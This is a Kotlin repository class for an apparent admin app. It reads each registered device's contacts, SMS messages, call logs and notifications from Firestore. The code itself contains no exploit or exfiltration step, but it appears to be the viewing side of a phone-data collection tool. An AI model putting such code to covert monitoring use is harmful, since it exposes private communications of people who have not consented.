package com.datasync.admin.data.repository

import com.datasync.admin.domain.repository.AdminRepository
import com.datasync.admin.model.*
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.Query
import com.google.firebase.firestore.snapshots
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.map
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class AdminRepositoryImpl @Inject constructor(
    private val db: FirebaseFirestore
) : AdminRepository {

    override fun getDevices(): Flow<List<Device>> {
        return db.collection("devices")
            .orderBy("lastSyncTime", Query.Direction.DESCENDING)
            .snapshots()
            .map { snapshot -> snapshot.toObjects(Device::class.java) }
    }

    override fun getContacts(deviceId: String): Flow<List<Contact>> {
        return db.collection("devices")
            .document(deviceId)
            .collection("contacts")
            .orderBy("name")
            .snapshots()
            .map { snapshot -> snapshot.toObjects(Contact::class.java) }
    }

    override fun getSMS(deviceId: String): Flow<List<SMS>> {
        return db.collection("devices")
            .document(deviceId)
            .collection("sms")
            .orderBy("date", Query.Direction.DESCENDING)
            .snapshots()
            .map { snapshot -> snapshot.toObjects(SMS::class.java) }
    }

    override fun getCallLogs(deviceId: String): Flow<List<CallLog>> {
        return db.collection("devices")
            .document(deviceId)
            .collection("calllogs")
            .orderBy("date", Query.Direction.DESCENDING)
            .snapshots()
            .map { snapshot -> snapshot.toObjects(CallLog::class.java) }
    }

    override fun getNotifications(deviceId: String): Flow<List<NotificationData>> {
        return db.collection("devices")
            .document(deviceId)
            .collection("notifications")
            .orderBy("timestamp", Query.Direction.DESCENDING)
            .snapshots()
            .map { snapshot -> snapshot.toObjects(NotificationData::class.java) }
    }
}
